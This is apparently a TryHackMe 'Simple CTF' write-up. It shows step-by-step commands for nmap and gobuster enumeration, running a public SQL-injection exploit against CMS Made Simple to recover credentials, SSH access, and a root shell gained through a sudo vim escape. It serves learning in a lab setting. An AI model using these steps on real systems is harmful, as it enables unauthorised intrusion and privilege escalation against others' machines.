# 🎯 Simple CTF - TryHackMe

## 📌 Information

| Field          | Value                                          |
| -------------- | ---------------------------------------------- |
| **Machine**    | Simple CTF                                     |
| **Platform**   | TryHackMe                                      |
| **Difficulty** | Easy                                           |
| **OS**         | Linux                                          |
| **Category**   | Enumeration / FTP / Web / Privilege Escalation |

---

# 🎯 Objective

Gain root access to the Linux machine by enumerating exposed services, obtaining user credentials, and exploiting a sudo misconfiguration.

---

# 🛰️ Reconnaissance

The first step was identifying open ports and running services using **Nmap**.

### Scan

```bash
nmap -sC -sV -oN scan.txt MACHINE_IP
```

### Results

| Port | Service | Version            |
| ---- | ------- | ------------------ |
| 21   | FTP     | vsftpd             |
| 80   | HTTP    | Apache HTTP Server |
| 2222 | SSH     | OpenSSH            |

### Notes

* Anonymous FTP access was disabled.
* A web application was hosted on port 80.
* SSH was running on the non-standard port **2222**.

---

# 🔍 Enumeration

## Directory Enumeration

Search for hidden directories:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Interesting directories:

```text
/simple
```

The discovered directory contained a **CMS Made Simple** installation.

---

## CMS Enumeration

Determine the CMS version:

```bash
curl http://MACHINE_IP/simple/
```

The version was vulnerable to a public SQL Injection vulnerability.

Search for exploits:

```bash
searchsploit CMS Made Simple
```

A Python exploit was available for credential extraction.

---

# 💥 Exploitation

Download the exploit:

```bash
searchsploit -m php/webapps/46635.py
```

Execute the exploit:

```bash
python3 46635.py -u http://MACHINE_IP/simple
```

The exploit successfully extracted administrator credentials.

Connect via SSH:

```bash
ssh mitch@MACHINE_IP -p 2222
```

### Result

A shell was successfully obtained as the **mitch** user.

Verify access:

```bash
whoami
```

Output:

```text
mitch
```

---

# ⬆️ Privilege Escalation

Enumerate sudo permissions:

```bash
sudo -l
```

Output:

```text
User mitch may run the following commands:

(root) NOPASSWD: /usr/bin/vim
```

Since **vim** was allowed to run as root without a password, the GTFOBins technique could be used.

Execute:

```bash
sudo vim -c ':!/bin/bash'
```

Verify privileges:

```bash
whoami
```

Output:

```text
root
```

---

# 🚩 Flags

## User Flag

```text
<user_flag>
```

## Root Flag

```text
<root_flag>
```

---

# 📚 What I Learned

* Service enumeration with Nmap.
* Directory brute forcing using Gobuster.
* Identifying vulnerable CMS versions.
* Exploiting SQL Injection to recover credentials.
* SSH authentication using recovered credentials.
* Enumerating sudo privileges.
* Privilege escalation using **GTFOBins**.

---

# 🛠️ Tools Used

* Nmap
* Gobuster
* Searchsploit
* Python
* OpenSSH
* GTFOBins

---

# 📖 MITRE ATT&CK

| Technique | Description                       |
| --------- | --------------------------------- |
| T1046     | Network Service Discovery         |
| T1190     | Exploit Public-Facing Application |
| T1110     | Credential Access                 |
| T1021.004 | SSH                               |
| T1548.003 | Sudo and Sudo Caching             |

---

# 📷 Screenshots

Recommended screenshots:

* Nmap scan
* Gobuster results
* CMS Made Simple homepage
* Searchsploit output
* Exploit execution
* Extracted credentials
* SSH login as **mitch**
* `sudo -l` output
* Root shell
* Flags

---

# ✅ Summary

Simple CTF is an excellent beginner Linux machine that introduces a complete penetration testing workflow. The room covers reconnaissance, web enumeration, exploitation of a vulnerable **CMS Made Simple** installation to recover credentials, SSH access, and privilege escalation through a misconfigured **sudo** rule. It provides practical experience with web exploitation, credential reuse, and common Linux privilege escalation techniques.
